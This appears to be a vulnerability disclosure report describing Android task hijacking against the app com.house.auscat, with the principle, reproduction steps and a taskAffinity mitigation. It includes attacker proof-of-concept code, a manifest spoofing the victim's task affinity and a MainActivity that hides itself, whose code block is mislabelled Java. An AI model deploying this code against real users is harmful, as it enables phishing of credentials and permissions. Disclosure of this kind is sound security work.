# Android Manifest Misconfiguration Leading to Task Hijacking in Cat House  app(com.house.auscat) 

## Description

Task Hijacking allows malicious apps to inherit permissions of vulnerable apps and is usually used for phishing login credentials of victims,its used by malicious actors to manipulate or take over tasks in Android, leading to significant vulnerabilities, This vulnerability applies to all Android versions before Android 11. The AndroidManifest.xml configuration needs to be modified to mitigate this attack.

## Steps To Reproduce:

1. The user downloads a malicious app
2. The user uses the malicious apps
3. The user uses the victim app. The activity seen at this time is not the original activity of the app, but the phishing activity of the malicious app
4. The user thinks that he is using the victim app (actually a malicious app) to enter personal information, resulting in account information leakage or inducing the user to grant the malicious app corresponding permissions.

## Video Proof of Concept

![caller.id.phone.number.block](./video/com.house.auscat.gif)

It can be seen that after executing the malicious program, the task is successfully hijacked, and the malicious application is actually opened when the victim application is launched.

## Principle

Because the taskAffinity attribute of most applications is not set and defaults to its package name, we can set a taskAffinity value that is consistent with the package name of the application we are attacking in a hackactivity attribute of the malware. Then, when the hackactivity starts, it will create a task stack that is the same as the taskAffinity attribute of the victim application. At that time, it will share a task stack with the victim's application and be located at the root of the task stack. When we start the victim application, the victim's task will be brought to the foreground, and then the hackactivity at the root will be brought to the foreground. Then, when we open the victim application, the activity we see is not the original activity of the application, but our hackactivity. Then we can design a phishing page in the hackactivity to implement a phishing attack, obtain the user's privacy and induce the user to grant the malware corresponding permissions.





## Mitigation

To prevent this attack you will need to set taskAffinity property of the application activities to taskAffinity= "" in the <activity> tag of the AndroidManifest.xml to force the activities to use a randomly generated task affinity, or set it at the <application> tag to enforce on all activities in the application.

## Attacker App Code

### Android Manifest

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.strandhogg.v1"
    tools:ignore="ExtraText">
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme"
        android:taskAffinity="com.house.auscat">
        <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

### Main Activity

```java
import android.os.Bundle
import android.content.Intent;
import androidx.appcompat.app.AppCompatActivity


class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        moveTaskToBack(true);
    }
    override fun onResume() {
        super.onResume()
        setContentView(R.layout.activity_main)
    }
}
```

### Impact

Due to a misconfiguration in the Android manifest file, it was possible to a perform a task hijacking attack. An attacker could create a malicious mobile application which could hijack a legitimate app and steal any potential sensitive information when installed on the victim's device.



## References

- https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06